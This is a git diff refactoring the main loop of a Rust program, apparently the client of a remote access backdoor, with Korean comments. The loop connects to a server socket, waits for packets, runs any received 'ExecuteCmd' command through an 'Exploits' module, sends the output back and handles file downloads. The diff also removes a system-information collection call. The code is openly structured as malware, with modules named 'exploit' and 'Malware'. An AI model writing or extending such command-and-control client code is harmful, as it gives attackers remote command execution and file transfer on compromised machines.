@@ -3,22 +3,22 @@ mod exploit;
 mod structure;
 mod stprotocol;
 
-
 use std::fs::File;
 use std::io::Read;
 use std::path::{Path};
 use exploit::{Malware, Exploits };
 use structure:: {StructStone, StructStonePayload, StoneTransferProtocol, Detector, Generator};
 use stprotocol::{ Session, Client };
-use crate::structure::StructRawStonePayload;
 
 fn main() {
-    let mut client = Session::new("127.0.0.1:6974".to_string()); //서버와의 통신을 위한 세션 생성 (서버로 연결요청 전송)
-    let mut packet = StructStone::default();
-    let mut exploit = Exploits::default();
+    event_loop(
+        Session::new("127.0.0.1:6974".to_string()),
+        StructStone::default(),
+        Exploits::default()
+    )
+}
 
-    StructRawStonePayload::sysinfo();
-
+fn event_loop(mut client: Session,mut packet: StructStone,mut exploit: Exploits){
     loop { // 새션 생성후 서버와 지속적인 통신을 위한 루프문
 
         packet = client.receiving(StructStone::default());// 연결요청후 서버의 응답 대기
@@ -27,10 +27,12 @@ fn main() {
 
         match packet.header_type() { // 서버의 응답 타입을 비교하여 보낼 요청을 생성함
             StoneTransferProtocol::ExecuteCmd => { // 타입이 Request 일 경우
-                packet = StructStonePayload::new(vec![],
-                                                 exploit.command(packet.get_command()).execute(),
-                                            vec![]).to_stone(); // 클라이언트 응답을 생성
-                client.send(packet.stone) // 생성한 응답을 전송
+                let output = StructStonePayload::new(
+                    vec![],
+                    exploit.command(packet.get_command()).execute(),
+                    vec![]
+                ).to_stone().stone;
+                client.send(output) // 생성한 응답을 전송
             },
             StoneTransferProtocol::Download => { // 타입이 Request 일 경우
                 match String::from_utf8(packet.get_file()) {
